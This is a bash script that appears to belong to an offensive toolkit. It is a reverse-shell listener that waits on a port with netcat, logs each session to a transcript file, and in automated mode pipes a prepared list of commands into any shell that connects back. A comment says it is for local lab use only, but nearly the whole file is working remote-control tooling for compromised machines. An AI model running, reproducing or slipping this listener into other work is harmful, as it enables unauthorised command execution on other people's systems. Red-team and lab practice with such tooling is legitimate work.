#!/usr/bin/env bash
#
# deliveries/shared/listener.sh
#
# Simple bash/nc reverse-shell listener helper.
#
# Intended for:
#   - reverse_shell/bash_auto.conf
#   - reverse_shell/bash_manual.conf
#
# This helper intentionally stays lightweight and transparent so the operator
# can easily observe and debug shell sessions.
#
# Environment variables:
#
#   LHOST
#   LPORT
#   TRANSCRIPT_FILE
#   COMMANDS_FILE
#   AUTOMATED
#
# Defaults:
#
#   LHOST=0.0.0.0
#   LPORT=4444
#
# Notes:
#
#   - In automated mode, commands are piped into the shell session.
#   - In manual mode, the operator interacts directly.
#   - Transcript recording uses tee.
#
# This is intended only for local lab environments.

set -euo pipefail

FRAMEWORK_ROOT="${FRAMEWORK_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)}"
source "$FRAMEWORK_ROOT/lib/log_utils.sh"

require_command() {
    local cmd="$1"

    command -v "$cmd" >/dev/null 2>&1 || \
        fail "Missing required command: $cmd"
}

require_command nc
require_command mkfifo
require_command tee

LHOST="${LHOST:-0.0.0.0}"
LPORT="${LPORT:-4444}"

AUTOMATED="${AUTOMATED:-false}"

TRANSCRIPT_FILE="${TRANSCRIPT_FILE:-shell_transcript.log}"
COMMANDS_FILE="${COMMANDS_FILE:-}"

FIFO_PATH="$(mktemp -u /tmp/aegis_listener_fifo.XXXXXX)"

cleanup() {
    rm -f "$FIFO_PATH"
}

trap cleanup EXIT

log "Starting bash reverse-shell listener"
log "Host: $LHOST"
log "Port: $LPORT"
log "Automated: $AUTOMATED"

mkfifo "$FIFO_PATH"

if [[ "$AUTOMATED" == "true" ]]; then

    [[ -n "$COMMANDS_FILE" ]] || \
        fail "COMMANDS_FILE must be set in automated mode"

    [[ -f "$COMMANDS_FILE" ]] || \
        fail "Missing commands file: $COMMANDS_FILE"

    log "Using commands file: $COMMANDS_FILE"

    nc -lvnp "$LPORT" < "$FIFO_PATH" \
        | tee "$TRANSCRIPT_FILE" &

    LISTENER_PID="$!"

    sleep 2

    cat "$COMMANDS_FILE" > "$FIFO_PATH"

    wait "$LISTENER_PID" || true

else

    log "Manual interaction mode active"

    nc -lvnp "$LPORT" \
        | tee "$TRANSCRIPT_FILE"

fi

log "Listener complete"
